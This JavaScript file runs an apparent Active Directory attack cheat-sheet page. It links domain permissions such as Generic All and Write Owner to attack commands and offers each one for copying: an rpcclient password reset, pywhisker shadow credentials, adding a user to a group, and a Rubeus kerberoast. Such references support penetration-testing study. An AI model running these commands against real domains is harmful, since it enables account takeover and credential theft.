// Sample data
const attributes = {
  generic_all: {
    name: "Generic All",
    attacks: ["change_password", "shadow_credentials"]
  },
  generic_write: {
    name: "Generic Write",
    attacks: ["add_to_group", "targeted_kerberoast"]
  },
  allowed_to_act: {
    name: "Allowed To Act",
    attacks: ["shadow_credentials"]
  },
  write_owner: {
    name: "Write Owner",
    attacks: ["change_password"]
  }
};

const attacks = {
  change_password: {
    name: "Change Password",
    command: "rpcclient -U username%password //dc-ip -c 'setuserinfo2 target-user 23 \"NewPass123\"'"
  },
  shadow_credentials: {
    name: "Shadow Credentials",
    command: "python3 pywhisker.py --add --target target-user --domain domain --dc-ip dc-ip"
  },
  add_to_group: {
    name: "Add to Group",
    command: "net rpc group addmem 'GroupName' target-user -U username%password -S dc-ip"
  },
  targeted_kerberoast: {
    name: "Targeted Kerberoast",
    command: "Rubeus.exe kerberoast /user:target-user /domain:domain"
  }
};

let selectedAttribute = null;

document.addEventListener('DOMContentLoaded', () => {
  renderAttributes();
  showAllAttacks();
});

function renderAttributes() {
  const attrList = document.getElementById('attributes-list');
  attrList.innerHTML = "";
  for (const key in attributes) {
    const li = document.createElement('li');
    li.className = 'attribute';
    li.textContent = attributes[key].name;
    li.onclick = () => toggleAttribute(li, key);
    attrList.appendChild(li);
  }
}

function showAllAttacks() {
  const attackList = document.getElementById('attacks-list');
  attackList.innerHTML = "";
  for (const key in attacks) {
    const li = document.createElement('li');
    li.className = 'attack';
    li.textContent = attacks[key].name;
    li.onclick = () => showCommand(key);
    attackList.appendChild(li);
  }
}

function toggleAttribute(element, attributeKey) {
  if (selectedAttribute === attributeKey) {
    selectedAttribute = null;
    element.classList.remove('selected');
    showAllAttacks();
  } else {
    document.querySelectorAll('.attribute').forEach(attr => attr.classList.remove('selected'));
    selectedAttribute = attributeKey;
    element.classList.add('selected');
    filterAttacks(attributeKey);
  }
}

function filterAttacks(attributeKey) {
  const attackKeys = attributes[attributeKey].attacks;
  const attackList = document.getElementById('attacks-list');
  attackList.innerHTML = "";
  attackKeys.forEach(a => {
    const li = document.createElement('li');
    li.className = 'attack';
    li.textContent = attacks[a].name;
    li.onclick = () => showCommand(a);
    attackList.appendChild(li);
  });
}

function showCommand(attackKey) {
  const cmd = attacks[attackKey].command;
  const name = attacks[attackKey].name;
  document.getElementById('command-area').innerHTML = `
    <h4>${name}</h4>
    <pre>${cmd}</pre>
    <button onclick="copyCommand(\`${cmd}\`)">Copy Command</button>
  `;
}

function copyCommand(text) {
  navigator.clipboard.writeText(text).then(() => {
    alert('Command copied to clipboard!');
  });
}

